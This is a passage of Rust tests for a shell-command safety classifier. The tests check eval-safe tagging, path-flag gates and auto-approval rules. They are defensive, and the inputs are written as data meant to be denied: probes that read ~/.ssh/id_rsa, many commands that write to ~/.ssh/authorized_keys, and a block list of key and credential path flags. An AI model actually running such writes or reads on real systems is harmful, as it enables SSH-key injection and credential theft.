        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            bare = false
            max_positional = 0
            standalone = ["--bash", "--zsh", "--verbose"]
            eval_safe = true
            eval_safe_flags = ["--bash", "--zsh", "--verbose"]
            eval_safe_required_flags = ["--bash", "--zsh"]
        "#);
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash"])));
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash", "--verbose"])));
        // --verbose alone misses the required set.
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--verbose"])));
    }

    #[test]
    fn required_flags_empty_does_not_constrain() {
        // Default behavior (mise activate shape): empty required_flags
        // means bare invocation is fine.
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "activate"
            bare = true
            max_positional = 0
            eval_safe = true
        "#);
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "activate"])));
    }

    #[test]
    #[should_panic(expected = "eval_safe_required_flags` but not in `eval_safe_flags")]
    fn required_flag_not_in_allowlist_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            bare = false
            max_positional = 0
            standalone = ["--bash"]
            eval_safe = true
            eval_safe_flags = ["--bash"]
            eval_safe_required_flags = ["--bash", "--zsh"]
        "#);
    }

    proptest::proptest! {
        /// For any spec with `eval_safe_required_flags = [...]`, the
        /// walker accepts iff at least one of those flags is present
        /// in the invocation (and every flag is in the allowlist).
        /// We model the invocation as a random subset of the allowed
        /// flags.
        #[test]
        fn walker_required_flag_invariant(
            include_bash in proptest::bool::ANY,
            include_zsh in proptest::bool::ANY,
            include_fish in proptest::bool::ANY,
            include_nushell in proptest::bool::ANY,
        ) {
            let spec = fzf_shell_init_spec();
            let mut words = vec!["demo"];
            if include_bash { words.push("--bash"); }
            if include_zsh { words.push("--zsh"); }
            if include_fish { words.push("--fish"); }
            if include_nushell { words.push("--nushell"); }
            let any_present = include_bash || include_zsh || include_fish || include_nushell;
            let tokens = toks(&words);
            let actual = super::is_eval_safe_for_spec(&spec, &tokens);
            proptest::prop_assert_eq!(
                actual,
                any_present,
                "walker disagreed for {:?}: expected {}, got {}",
                words, any_present, actual,
            );
        }
    }

    // -------------------------------------------------------------------
    // Adversarial-review hardening (must-fix #1, H3, H4)
    // -------------------------------------------------------------------

    /// Must-fix #1: a valued flag tagged eval-safe without an entry in
    /// `eval_safe_flag_values` panics at build time. This catches the
    /// aws v0.196.0 near-miss pattern where `--format` defaulting to
    /// `process` (JSON) would substitute JSON into eval.
    #[test]
    #[should_panic(expected = "Every valued flag tagged eval-safe must declare its value posture")]
    fn valued_flag_without_value_posture_panics_sub() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "export"
            bare = true
            max_positional = 0
            valued = ["--format"]
            eval_safe = true
            eval_safe_flags = ["--format"]
        "#);
    }

    /// Same check applied at command level for flat commands.
    #[test]
    #[should_panic(expected = "Every valued flag tagged eval-safe must declare its value posture")]
    fn valued_flag_without_value_posture_panics_command() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            bare = true
            valued = ["--format"]
            eval_safe = true
            eval_safe_flags = ["--format"]
        "#);
    }

    /// Explicit-unrestricted form (`= []`) is the documented opt-out
    /// for valued flags whose value doesn't affect stdout shape (like
    /// `--profile NAME`). The build must accept this — it's the
    /// contributor declaring "I considered this and decided no value
    /// allowlist is needed."
    #[test]
    fn valued_flag_explicit_unrestricted_builds() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "export"
            bare = true
            max_positional = 0
            valued = ["--profile"]
            eval_safe = true
            eval_safe_flags = ["--profile"]
            [command.sub.eval_safe_flag_values]
            --profile = []
        "#);
        // Walker accepts any bare-literal value for the unrestricted flag.
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev"])));
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile=staging"])));
        // But the flag is still structurally valued: missing value denies.
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile"])));
    }

    /// H3: combined short-flag clusters (`-sk`) are intentionally
    /// denied even when the individual flags are tagged. The walker
    /// compares the whole token `-sk` against `eval_safe_flags`; it
    /// never matches the entries `-s` and `-k` separately. This
    /// matters because cluster parsing has subtle order-dependent
    /// semantics across tools and the eval-safe contract should be
    /// "the exact flag-token the contributor vetted, not a cluster."
    #[test]
    fn walker_denies_combined_short_cluster() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            bare = true
            standalone = ["-s", "-k", "-sk"]
            eval_safe = true
            eval_safe_flags = ["-s", "-k"]
        "#);
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-s"])));
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-k"])));
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-s", "-k"])));
        // Clustering: walker compares "-sk" against eval_safe_flags
        // which has individual "-s" and "-k". Whole-token mismatch =>
        // deny. Even though the dispatcher would accept (if the
        // contributor added "-sk" to standalone), the walker says no.
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "-sk"])));
    }

    /// H2 (clarification): the walker is intentionally INDEPENDENT of
    /// dispatcher constraints like max_positional. Eval-safety is
    /// gated end-to-end by `cst/check.rs::eval_verdict`, which runs
    /// `word_sub_verdict` (full dispatcher validation) BEFORE the
    /// walker. By the time the walker runs, the dispatcher has
    /// already accepted the invocation. The walker only adds the
    /// extra "is this tagged eval-safe" check on top.
    ///
    /// So a property like "walker accept => dispatcher accept" is
    /// neither true (walker may accept token sequences the
    /// dispatcher denies, like `cmd init a a` exceeding
    /// max_positional) nor required for safety. The
    /// `eval_verdict.combine(word_sub_verdict)` composition is what
    /// guarantees end-to-end safety. We test that composition via the
    /// `eval_*` tests in `src/tests.rs`, not here.

    /// H4: an unrecognized field inside a matrix block (e.g. a
    /// contributor putting `eval_safe = true` directly on a matrix
    /// action) fails at TOML parse time rather than silently doing
    /// nothing. eval-safe tagging lives on TOML-declared subs, never
    /// on matrix actions — but the schema previously accepted
    /// arbitrary extra fields and dropped them.
    #[test]
    fn matrix_unknown_field_rejected() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
                [[command]]
                name = "demo"
                handler = "php"
                researched_version = "v1.0"
                [[command.matrix]]
                parents = ["a"]
                level = "Inert"
                eval_safe = true
                actions.foo = "p1"
                [command.handler_policy.p1]
                standalone = ["--x"]
            "#);
        });
        assert!(result.is_err(), "matrix block with eval_safe should panic at parse time");
    }

    #[test]
    fn matrix_action_detailed_unknown_field_rejected() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
                [[command]]
                name = "demo"
                handler = "php"
                researched_version = "v1.0"
                [[command.matrix]]
                parents = ["a"]
                level = "Inert"
                actions.foo = { policy = "p1", eval_safe = true }
                [command.handler_policy.p1]
                standalone = ["--x"]
            "#);
        });
        assert!(result.is_err(), "matrix action with eval_safe should panic at parse time");
    }

    /// Conservation law for the legacy path-gate: a command exposing a flag whose NAME is
    /// unambiguously a filesystem path (`--outfile`, `--keyout`, `--password-file`, …) must
    /// declare that flag's read/write role — in its own `[command.path_gate]` or a central
    /// `pathgates.toml [roles.X]` — so it can't read/write an arbitrary system/secret path
    /// ungated. The ambiguous `-o`/`--output` set (usually an output FORMAT, not a path) is out
    /// of scope BY DESIGN: no static rule tells `-o file` from `-o json`, so those rely on
    /// adversarial review + co-located annotation. Adding an unambiguous flag name below, or a
    /// new command that exposes one without a role, turns this test red.
    #[test]
    fn every_unambiguous_path_flag_declares_a_role() {
        use super::types::{TomlFile, TomlSub};

        const PATH_FLAG_NAMES: &[&str] = &[
            "--outfile", "--output-file", "--output-dir", "--output-path",
            "--dest-dir", "--destination", "--infile", "--input-file",
            "--load-privkey", "--load-certificate", "--load-pubkey",
            "--load-ca-certificate", "--load-request", "--pskfile",
            "--password-file", "--cacert", "--keyout", "--tls-client-cert",
            "--key-file", "--cert-file", "--ca-file",
            // Single-dash Go-style spellings (mkcert `-cert-file`): the same name, one dash. A
            // Go tool accepts both, so an undeclared single-dash path flag is a live bypass.
            "-outfile", "-output-file", "-output-dir", "-output-path",
            "-dest-dir", "-destination", "-infile", "-input-file",
            "-pskfile", "-password-file", "-cacert", "-keyout",
            "-tls-client-cert", "-key-file", "-cert-file", "-ca-file",
        ];

        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
            for entry in std::fs::read_dir(dir).unwrap() {
                let path = entry.unwrap().path();
                if path.is_dir() {
                    toml_files(&path, out);
                } else if path.extension().is_some_and(|e| e == "toml") {
                    out.push(path);
                }
            }
        }

        // Every `valued` flag on a command and its (nested) subs — a path flag may sit on a sub.
        fn collect_flags<'a>(valued: &'a [String], subs: &'a [TomlSub], out: &mut Vec<&'a str>) {
            out.extend(valued.iter().map(String::as_str));
            for s in subs {
                collect_flags(&s.valued, &s.sub, out);
            }
        }

        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
        let mut files = Vec::new();
        toml_files(&root, &mut files);

        let mut failures = Vec::new();
        for file in &files {
            let src = std::fs::read_to_string(file).unwrap();
            let parsed: TomlFile =
                toml::from_str(&src).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
            for cmd in &parsed.command {
                let mut flags = Vec::new();
                collect_flags(&cmd.valued, &cmd.sub, &mut flags);
                for f in flags {
                    if !PATH_FLAG_NAMES.contains(&f) {
                        continue;
                    }
                    let covered = cmd.path_gate.as_ref().is_some_and(|pg| pg.declares_flag(f))
                        || crate::pathgate::central_role_declares_flag(&cmd.name, f);
                    if !covered {
                        failures.push(format!(
                            "  {} — flag `{f}` (in {})",
                            cmd.name,
                            file.file_name().unwrap().to_string_lossy()
                        ));
                    }
                }
            }
        }
        assert!(
            failures.is_empty(),
            "commands with an unambiguous path flag but no declared path-gate role — add \
             `[command.path_gate]` with the flag's read/write role (see SAMPLE.toml):\n{}",
            failures.join("\n"),
        );
    }

    /// Behavioral guard over EVERY real `eval_safe` tag (the other eval_safe tests are build-time
    /// schema checks on synthetic TOMLs). For each tag: (a) it TAKES EFFECT — `eval "$(cmd …)"` in
    /// canonical form is allowed; and (b) it STAYS TIGHT — a flag the command itself accepts but that
    /// is NOT in `eval_safe_flags` must break eval-safety (else the tag rubber-stamps everything).
    /// Skips leaves needing a positional or a `eval_safe_flag_values` value we can't synthesize
    /// (those bare forms aren't self-sufficiently eval-safe — e.g. `aws … export-credentials` whose
    /// default `--format` is JSON, or `starship init <shell>`). Auto-covers every future tag.
    #[test]
    fn every_eval_safe_tag_takes_effect_and_stays_tight() {
        use super::types::{TomlFile, TomlSub};
        use crate::is_safe_command;

        struct Leaf {
            path: Vec<String>,
            flags: Vec<String>,
            required: Vec<String>,
            require_any: Vec<String>,
            has_values: bool,
            standalone: Vec<String>,
        }

        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
            for e in std::fs::read_dir(dir).unwrap() {
                let p = e.unwrap().path();
                if p.is_dir() {
                    toml_files(&p, out);
                } else if p.extension().is_some_and(|x| x == "toml") {
                    out.push(p);
                }
            }
        }

        #[allow(clippy::too_many_arguments)]
        fn walk(
            path: &mut Vec<String>,
            standalone: &[String],
            eval_safe: Option<bool>,
            flags: &[String],
            required: &[String],
            require_any: &[String],
            has_values: bool,
            subs: &[TomlSub],
            out: &mut Vec<Leaf>,
        ) {
            if eval_safe == Some(true) {
                out.push(Leaf {
                    path: path.clone(),
                    flags: flags.to_vec(),
                    required: required.to_vec(),
                    require_any: require_any.to_vec(),
                    has_values,
                    standalone: standalone.to_vec(),
                });
            }
            for s in subs {
                path.push(s.name.clone());
                walk(
                    path,
                    &s.standalone,
                    s.eval_safe,
                    &s.eval_safe_flags,
                    &s.eval_safe_required_flags,
                    &s.require_any,
                    !s.eval_safe_flag_values.is_empty(),
                    &s.sub,
                    out,
                );
                path.pop();
            }
        }

        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
        let mut files = Vec::new();
        toml_files(&root, &mut files);
        let mut leaves = Vec::new();
        for file in &files {
            let src = std::fs::read_to_string(file).unwrap();
            let parsed: TomlFile =
                toml::from_str(&src).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
            for cmd in &parsed.command {
                let mut path = vec![cmd.name.clone()];
                walk(
                    &mut path,
                    &cmd.standalone,
                    cmd.eval_safe,
                    &cmd.eval_safe_flags,
                    &cmd.eval_safe_required_flags,
                    &cmd.require_any,
                    !cmd.eval_safe_flag_values.is_empty(),
                    &cmd.sub,
                    &mut leaves,
                );
            }
        }
        assert!(!leaves.is_empty(), "expected the registry to contain eval_safe tags");

        const HELP: &[&str] = &["--help", "-h", "--version", "-V"];
        let mut failures = Vec::new();
        for leaf in &leaves {
            // Build the canonical eval-safe invocation: path + a required flag + an eval-safe
            // `require_any` token (the `init -` shape: bare `jenv init` is denied by require_any, so
            // the canonical must carry `-`). If require_any has no eval-safe member, no invocation can
            // be both valid and eval-safe — skip rather than false-fail.
            let mut tokens = leaf.path.clone();
            let mut buildable = true;
            if let Some(rf) = leaf.required.first() {
                tokens.push(rf.clone());
            }
            if !leaf.require_any.is_empty() {
                match leaf
                    .require_any
                    .iter()
                    .find(|t| leaf.flags.contains(t) || leaf.required.contains(t))
                {
                    Some(ra) if !tokens.contains(ra) => tokens.push(ra.clone()),
                    Some(_) => {}
                    None => buildable = false,
                }
            }
            if !buildable {
                // require_any forces a token to be present for validity, but none of those tokens is
                // eval-safe — so no invocation is ever both valid AND eval-safe. The tag is dead.
                failures.push(format!(
                    "dead tag: `{}` requires one of {:?} to be valid, but none is in eval_safe_flags — eval-safety can never take effect",
                    leaf.path.join(" "),
                    leaf.require_any,
                ));
                continue;
            }
            let canonical = tokens.join(" ");
            // (a) TAKES EFFECT — only when canonical is a self-sufficient shell-init command (no
            // value-gated flag needed, and the bare form is itself a valid command).
            if !leaf.has_values && is_safe_command(&canonical) {
                let eval_line = format!("eval \"$({canonical})\"");
                if !is_safe_command(&eval_line) {
                    failures.push(format!(
                        "tag has no effect: `{eval_line}` denied though `{canonical}` is allowed"
                    ));
                }
            }
            // (b) STAYS TIGHT — a flag the command accepts but that isn't eval-safe breaks it.
            if let Some(poison) = leaf.standalone.iter().find(|f| {
                !leaf.flags.contains(f) && !leaf.required.contains(f) && !HELP.contains(&f.as_str())
            }) {
                let poison_cmd = format!("{canonical} {poison}");
                if is_safe_command(&poison_cmd) {
                    let eval_poison = format!("eval \"$({poison_cmd})\"");
                    if is_safe_command(&eval_poison) {
                        failures.push(format!(
                            "allowlist not tight: `{eval_poison}` allowed but `{poison}` isn't in eval_safe_flags"
                        ));
                    }
                }
            }
        }
        assert!(failures.is_empty(), "eval_safe behavioral guard:\n{}", failures.join("\n"));
    }

    /// Flag parity across subcommand FAMILIES — sibling subs that genuinely share a core flag set
    /// must ALL accept every flag in it, so one sub's list can't silently drift from the others.
    /// Dogfooding found `cargo doc/build/bench --workspace` denied exactly this way. Adding a family
    /// row LOCKS that family against future drift (even families with no current bug — go/kubectl were
    /// already consistent, so pinning them keeps them so). Each (family, flag) is verified against the
    /// live classifier; only add a row/flag that is genuinely shared by every listed sub, or the guard
    /// false-fails. To EXTEND: append a `Family`, run the test, and treat any failure as a real drift
    /// bug (fix the TOML) unless the flag isn't actually universal (then it doesn't belong in the row).
    #[test]
    fn subcommand_families_share_core_flags() {
        use crate::is_safe_command;

        struct Family {
            command: &'static str,
            subs: &'static [&'static str],
            standalone: &'static [&'static str],
            valued: &'static [(&'static str, &'static str)],
        }

        const FAMILIES: &[Family] = &[
            // cargo's build-and-analyze subs share package-selection + compile flags. Excluded:
            // `run` (executes the built binary — intentionally code-exec-restricted) and `fix`
            // (rewrites source; not a sub).
            Family {
                command: "cargo",
                subs: &["build", "check", "test", "doc", "clippy", "bench"],
                standalone: &[
                    "--workspace", "--all", "--release", "--offline", "--locked", "--frozen",
                    "--all-features", "--no-default-features",
                ],
                valued: &[
                    ("--features", "foo"),
                    ("--target", "x86_64-unknown-linux-gnu"),
                    ("--profile", "dev"),
                    ("--manifest-path", "Cargo.toml"),
                ],
            },
            // go build/test/vet share the build/module knobs (single-dash, value by space or `=`).
            Family {
                command: "go",
                subs: &["build", "test", "vet"],
                standalone: &["-v", "-x", "-n"],
                valued: &[("-tags", "foo")],
            },
            // .NET's build-family subs share configuration/restore knobs. (`run` executes — excluded.)
            Family {
                command: "dotnet",
                subs: &["build", "test", "publish"],
                standalone: &["--no-restore", "--nologo"],
                valued: &[("--configuration", "Release"), ("--framework", "net8.0")],
            },
            // swift build/test share the configuration selector. (`run` executes — excluded.)
            Family {
                command: "swift",
                subs: &["build", "test"],
                standalone: &[],
                valued: &[("-c", "release"), ("--configuration", "release")],
            },
            // OpenTofu's LOCAL read/format subs share `-no-color`. (`plan`/`apply` reach remote state
            // and are intentionally gated — not part of this family.)
            Family {
                command: "tofu",
                subs: &["validate", "show", "fmt"],
                standalone: &["-no-color"],
                valued: &[],
            },
        ];

        let mut failures = Vec::new();
        for fam in FAMILIES {
            for sub in fam.subs {
                for f in fam.standalone {
                    let cmd = format!("{} {sub} {f}", fam.command);
                    if !is_safe_command(&cmd) {
                        failures.push(cmd);
                    }
                }
                for (f, v) in fam.valued {
                    let cmd = format!("{} {sub} {f} {v}", fam.command);
                    if !is_safe_command(&cmd) {
                        failures.push(cmd);
                    }
                }
            }
        }
        assert!(
            failures.is_empty(),
            "subcommand family flag drift — a sub is missing a flag its siblings share:\n  {}",
            failures.join("\n  "),
        );
    }

    /// Behavioral conservation: every path-flag DECLARED in a gate (central `[roles.X]` or a
    /// command's own `[command.path_gate]`) must ACTUALLY deny a hot path. Catches a gate that is
    /// shadowed (a central `[roles.X]` hid a co-located flag — the qpdf bug), mis-spelled (a
    /// single-dash Go flag the double-dash gate missed — the mkcert bug), or otherwise non-firing.
    /// Operates on `should_deny` directly, so command usage-validation can't hand it a false pass.
    #[test]
    fn every_declared_path_flag_actually_gates() {
        use super::types::TomlFile;
        use crate::pathgate::Role;

        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
            for e in std::fs::read_dir(dir).unwrap() {
                let p = e.unwrap().path();
                if p.is_dir() {
                    toml_files(&p, out);
                } else if p.extension().is_some_and(|x| x == "toml") {
                    out.push(p);
                }
            }
        }

        let mut gates: Vec<(String, String, Role)> = crate::pathgate::central_flag_gates();
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
        let mut files = Vec::new();
        toml_files(&root, &mut files);
        for file in &files {
            let src = std::fs::read_to_string(file).unwrap();
            let parsed: TomlFile = toml::from_str(&src).unwrap();
            for cmd in &parsed.command {
                if let Some(pg) = &cmd.path_gate {
                    for (f, r) in pg.flag_roles() {
                        gates.push((cmd.name.clone(), f.to_string(), r));
                    }
                }
            }
        }

        let mut failures = Vec::new();
        for (cmd, flag, role) in gates {
            let hot = match role {
                Role::Write => "/etc/sc-probe-target",
                Role::Read => "~/.ssh/id_rsa",
                // A /tmp executor is the discriminating hot path: `write` would ALLOW it
                // (Temp is writable), but `exec` must DENY it (running staged/foreign code).
                Role::Exec => "/tmp/sc-probe/Cargo.toml",
                Role::Ignore => continue,
            };
            // Probe the space form (`flag hot`) AND the `flag=hot` glued form. A path-flag must
            // gate its value in EVERY spelling; the glued form is where single-dash-long flags
            // (Go-flag tools like terraform's `-out=…`) previously slipped the gate.
            let forms = [
                vec![cmd.clone(), flag.clone(), hot.to_string()],
                vec![cmd.clone(), format!("{flag}={hot}")],
            ];
            for form in forms {
                let toks: Vec<_> = form.iter().map(|s| crate::parse::Token::from_test(s)).collect();
                if !crate::pathgate::should_deny(&cmd, &toks) {
                    failures.push(format!("  {cmd} `{flag}` ({role:?}) did NOT deny {hot} — form {form:?}"));
                }
            }
        }
        assert!(
            failures.is_empty(),
            "declared path-flag gates that don't actually fire (shadowed / mis-spelled / wrong):\n{}",
            failures.join("\n")
        );
    }

    /// SWEEP DRIVER + regression ratchet for the ambiguous-output-flag WRITE hole. A valued flag like
    /// `-o`/`--output`/`-d`/`--write` that is a WRITE PATH (`asciidoctor -o`, `dot -o`, `gs -o`) but is
    /// NOT a declared path-gate lets an auto-approved command overwrite `~/.ssh/authorized_keys` /
    /// `.git/hooks/*` — SSH-key / shell-code injection at the default band. The
    /// `every_unambiguous_path_flag_declares_a_role` guard deliberately SKIPS these names ("usually a
    /// format, not a path"), which is wrong for the doc/image/diagram/build-tool class.
    ///
    /// Behavioral: for every top-level command declaring one of these flags, `<cmd> <flag>
    /// ~/.ssh/authorized_keys` must NOT auto-approve — either the flag GATES the path (a real writer →
    /// add `[command.path_gate]` write role) or it is GRANDFATHERED (a verified format-only flag,
    /// `-o json`, whose value is an enum not a path — a harmless permanent exemption). The grandfather
    /// set only SHRINKS as the sweep gates the real writers; a NEW output-flag command that
    /// auto-approves a sensitive write fails until resolved. Directly tests the security property, so a
    /// gated flag flips it green — the sweep's per-command confirmation.
    #[test]
    fn ambiguous_output_flags_do_not_write_sensitive_paths() {
        use super::types::TomlFile;
        const OUTPUT_FLAGS: &[&str] = &[
            "-o", "--output", "--out", "--outfile", "--write", "--replace-input", "output",
            // unambiguous output-DIRECTORY / output-path flags (low noise — these are paths, not
            // formats): a build tool / bundler / generator writes its artifacts to this dir.
            "--outdir", "--out-dir", "--outDir", "--target-dir", "--site-dir", "--output-dir",
            "--output-path", "--destination", "--dest",
        ];
        const SENSITIVE: &str = "~/.ssh/authorized_keys"; // user-writable, compromise-grade
        // The acknowledged worklist (shrinks only). A tab-separated `<command>\t<flag>` per row.
        let worklist: std::collections::HashSet<(String, String)> =
            include_str!("../../tests/fixtures/output_flag_worklist.tsv")
                .lines()
                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
                .filter_map(|l| l.split_once('\t').map(|(c, f)| (c.to_string(), f.to_string())))
                .collect();

        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
            for e in std::fs::read_dir(dir).unwrap() {
                let p = e.unwrap().path();
                if p.is_dir() {
                    toml_files(&p, out);
                } else if p.extension().is_some_and(|x| x == "toml") {
                    out.push(p);
                }
            }
        }

        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
        let mut files = Vec::new();
        toml_files(&root, &mut files);
        let mut holes = std::collections::HashSet::new();
        for file in &files {
            let src = std::fs::read_to_string(file).unwrap();
            let parsed: TomlFile = toml::from_str(&src).unwrap();
            for cmd in &parsed.command {
                for flag in &cmd.valued {
                    if OUTPUT_FLAGS.contains(&flag.as_str())
                        && crate::is_safe_command(&format!("{} {flag} {SENSITIVE} in", cmd.name))
                    {
                        holes.insert((cmd.name.clone(), flag.clone()));
                    }
                }
            }
        }

        // (a) A hole NOT on the worklist is a new/unacknowledged ungated write flag — fail closed.
        let mut unlisted: Vec<_> = holes.difference(&worklist).collect();
        unlisted.sort();
        assert!(
            unlisted.is_empty(),
            "NEW ungated output-flag writes ({}) — GATE (add a `[command.path_gate]` write role) or add \
             to tests/fixtures/output_flag_worklist.tsv with a verified format-only reason:\n{}",
            unlisted.len(),
            unlisted.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
        );
        // (b) A worklist entry that is NO LONGER a hole has been gated — remove it (the fix
        // confirmation; keeps the ratchet shrinking and the worklist honest).
        let mut stale: Vec<_> = worklist.difference(&holes).collect();
        stale.sort();
        assert!(
            stale.is_empty(),
            "worklist entries no longer auto-approve — they are GATED now; remove them from \
             tests/fixtures/output_flag_worklist.tsv ({} stale):\n{}",
            stale.len(),
            stale.iter().map(|(c, f)| format!("  {c} `{f}`")).collect::<Vec<_>>().join("\n"),
        );
    }

    /// DISCOVERY ratchet for POSITIONAL last-arg writers — the class the flag-based
    /// `ambiguous_output_flags_do_not_write_sensitive_paths` guard cannot enumerate (a converter whose
    /// output is the LAST positional, not a flag: `cjxl in out`, `pdfunite a b out`). Signal: probe
    /// every command `<cmd> <benign-input> ~/.ssh/authorized_keys`. A READER of that last positional
    /// already denies (its read-gate blocks the sensitive read), so a command that AUTO-APPROVES is
    /// either an ungated last-positional WRITER (gate it `shape = "last_write"`) or one that ignores
    /// the extra arg (harmless — acknowledge on the worklist).
    ///
    /// WHY a description heuristic, and what it does NOT promise. Behaviorally, a positional WRITER and
    /// a command that IGNORES a trailing arg are indistinguishable — both auto-approve — so the raw
    /// probe surfaces ~600 commands, ~99% harmless ignorers (`basename`, `date`, `bc`). The only signal
    /// that separates them is the researched description (a writer's says it "converts/encodes/writes a
    /// file"). So this ratchet is a best-effort DISCOVERY driver over the writer-shaped descriptions,
    /// NOT a completeness proof: a writer whose description dodges every trigger word is missed here.
    /// The fail-CLOSED guarantee for the writers we KNOW is the corpus test below
    /// (`positional_and_output_dir_writers_gate_sensitive_paths`) — this test keeps NEW writer-shaped
    /// commands from shipping ungated. The `declares_write_flag` exclusion is structural (not an `-o`
    /// probe, which is confounded by unknown-flag denials and the `last_write` positional gate itself):
    /// a command whose output is a declared write FLAG has input positionals, so its probe is a false
    /// positive already covered by the flag guard; a `last_write` SHAPE declares no write flag, so
    /// positional writers like `cjxl` are still covered.
    #[test]
    fn positional_last_arg_writers_are_gated_or_acknowledged() {
        const SENSITIVE: &str = "sc-probe-in.dat ~/.ssh/authorized_keys";
        let acknowledged: std::collections::HashSet<&str> =
            include_str!("../../tests/fixtures/positional_writer_worklist.tsv")
                .lines()
                .map(|l| l.trim())
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .filter_map(|l| l.split_whitespace().next())
                .collect();
        // A last-positional writer's researched description says it PRODUCES a file (converts/encodes/
        // decodes/renders/writes …). Kept deliberately broad on the object side ("output"/"file"/"to
        // …") so "writes a .jxl file" (cjxl) matches — an earlier narrow form that required "output"
        // silently skipped it. False positives just land on the worklist; the risk is a missed writer,
        // so err toward matching.
        fn writes_output(d: &str) -> bool {
            let d = d.to_ascii_lowercase();
            let action = ["convert", "render", "encode", "decode", "transcode", "compress",
                "writes", "produces", "emits"];
            let object = ["output", "writes a", "writes the", "creates a", "produces a",
                "to the file", "to a file", "to a new", "you name", "you supply",
                "last positional", "named output"];
            action.iter().any(|a| d.contains(a)) && object.iter().any(|o| d.contains(o))
        }
        let mut candidates: Vec<&str> = super::TOML_REGISTRY
            .iter()
            .filter(|(name, spec)| *name == &spec.name && writes_output(&spec.description))
            .map(|(name, _)| name.as_str())
            .filter(|name| crate::is_safe_command(&format!("{name} {SENSITIVE}")))
            .filter(|name| !crate::pathgate::declares_write_flag(name))
            .filter(|name| !acknowledged.contains(name))
            .collect();
        candidates.sort();
        assert!(
            candidates.is_empty(),
            "commands auto-approving a sensitive LAST-positional write ({}) — GATE the writers \
             (`shape = \"last_write\"`) or add the harmless ones (ignores the arg) to \
             tests/fixtures/positional_writer_worklist.tsv:\n  {}",
            candidates.len(),
            candidates.join("\n  "),
        );
    }

    /// Regression corpus for the output-flag sweep's RESIDUAL classes (adversarial-review follow-ups):
    /// positional last-arg writers (a converter whose output is the last positional, `shape =
    /// "last_write"`) and output-DIRECTORY flags. These are NOT covered by
    /// `every_declared_path_flag_actually_gates` (which probes only FLAG gates), so a shape gate could
    /// silently regress. Each write of a sensitive target must deny; each benign worktree form allows.
    #[test]
    fn positional_and_output_dir_writers_gate_sensitive_paths() {
        const S: &str = "~/.ssh/authorized_keys";
        let deny = [
            format!("pdfunite a.pdf b.pdf {S}"),
            format!("ps2pdf in.ps {S}"),
            format!("pdf2ps in.pdf {S}"),
            format!("pdftops in.pdf {S}"),
            format!("pdfcrop in.pdf {S}"),
            format!("lame in.wav {S}"),
            format!("cjxl in.png {S}"),
            format!("djxl in.jxl {S}"),
            format!("sphinx-build src {S}"),
            format!("sphinx-build -M html src {S}"),
            format!("weasyprint in.html {S}"),
            format!("tiffcp in.tif {S}"),
            format!("mkdocs build -d {S}"),
            format!("mkdocs build --site-dir {S}"),
            format!("gs -o {S} x.ps"),
            // Positional last-arg writer audit (converters + in-place mutators):
            format!("dvipdf in.dvi {S}"),
            format!("eps2eps in.eps {S}"),
            format!("ps2pdfwr in.ps {S}"),
            format!("pfbtopfa in.pfb {S}"),
            format!("tiff2bw in.tif {S}"),
            format!("tiffcrop in.tif {S}"),
            format!("pal2rgb in.tif {S}"),
            format!("jpgicc in.jpg {S}"),
            format!("tificc in.tif {S}"),
            format!("heif-thumbnailer in.heic {S}"),
            format!("wkhtmltopdf in.html {S}"),
            format!("gdbm_dump db.gdbm {S}"),
            format!("pkgbuild --root ./r {S}"),
            // in-place mutators: sensitive as the sole/last positional …
            format!("wasm-strip {S}"),
            format!("llvm-strip {S}"),
            format!("llvm-objcopy in.o {S}"),
            format!("install_name_tool -id x {S}"),
            format!("indent {S}"),
            format!("PlistBuddy {S}"),
            // … and multi-file in-place (`positional = "write"`) must gate a NON-last sensitive arg:
            format!("nbstripout {S} ok.ipynb"),
            format!("afscexpand {S} ./b"),
        ];
        for c in &deny {
            assert!(!crate::is_safe_command(c), "must deny a sensitive write: {c}");
        }
        for c in [
            "pdfunite a.pdf b.pdf ./out.pdf",
            "sphinx-build src ./_build",
            "weasyprint in.html ./out.pdf",
            "tiffcp in.tif ./out.tif",
            "mkdocs build -d ./site",
            "gs -o ./out.pdf x.ps",
            "dvipdf in.dvi ./out.pdf",
            "tiff2bw in.tif ./out.tif",
            "jpgicc in.jpg ./out.jpg",
            "wasm-strip ./mod.wasm",
            "nbstripout ./a.ipynb ./b.ipynb",
        ] {
